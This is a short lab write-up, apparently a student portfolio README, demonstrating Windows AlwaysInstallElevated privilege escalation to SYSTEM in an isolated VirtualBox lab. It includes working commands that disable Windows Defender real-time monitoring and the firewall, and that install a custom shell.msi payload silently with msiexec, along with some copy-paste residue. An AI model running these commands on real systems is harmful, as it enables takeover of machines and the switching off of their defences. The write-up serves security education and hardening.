\# AlwaysInstallElevated Privilege Escalation

\*\*Author:\*\* Chontele Coleman    
\*\*Date:\*\* June 16, 2025  

\---

\#\# 📖 Overview

In this project, I demonstrated the exploitation of the \*\*AlwaysInstallElevated\*\* vulnerability on Windows 10\. The objective was to escalate privileges from a low-privilege user account to \*\*SYSTEM\*\*, simulating a real-world misconfiguration that can be abused for full system compromise.

\---

\#\# 🖥️ Environment Setup

\- \*\*Host OS:\*\* Windows 10    
\- \*\*Virtualization:\*\* VirtualBox    
\- \*\*Guest OS:\*\* Windows 10 (Target)    
\- \*\*Shared Folder:\*\* \`Z:\\\` (used for payload transfer)  

\---

\#\# 🔧 Processes Implemented

\#\#\# ✅ Created a Low Privilege User

\`\`\`cmd  
net user lowpriv P@ssword123 /add  
net localgroup Users lowpriv /add  
🔍 Confirmed AlwaysInstallElevated Registry Keys  
cmd  
reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer  
reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer  
📁 Transferred Payload to Target  
Payload: shell.msi

Transfer method: Shared folder mounted as Z:\\

🔐 Temporarily Disabled Windows Defender & Firewall (Admin)  
powershell  
Copy

Set-MpPreference \-DisableRealtimeMonitoring $true  
Add-MpPreference \-ExclusionPath "Z:\\"  
Set-NetFirewallProfile \-Profile Domain,Public,Private \-Enabled False  
🚀 Executed Payload as Low-Privileged User  
cmd  
Copy  
Edit  
msiexec /quiet /qn /i Z:\\shell.msi  
✅ Privilege Escalation Verified  
Successful escalation was confirmed via a SYSTEM-level command prompt pop-up.

🧠 Conclusion  
This project successfully demonstrated how a common misconfiguration involving AlwaysInstallElevated can lead to full SYSTEM access from a standard user account. It highlights the critical need for proper Group Policy configuration and system hardening.

📝 Key Takeaways  
Misconfigured AlwaysInstallElevated registry keys pose critical security risks.

Even low-privilege users can compromise a system if configurations are weak.

Proper auditing and Group Policy enforcement are essential to mitigate such risks.

🛠️ Tools Used  
Windows Command Prompt

PowerShell

Kali Linux

msiexec

Custom shell.msi payload (for demonstration purposes)

⚠️ Security Note:  
All activities were performed in an isolated lab environment strictly for educational and ethical purposes. Never test or execute these techniques on unauthorized systems.

css

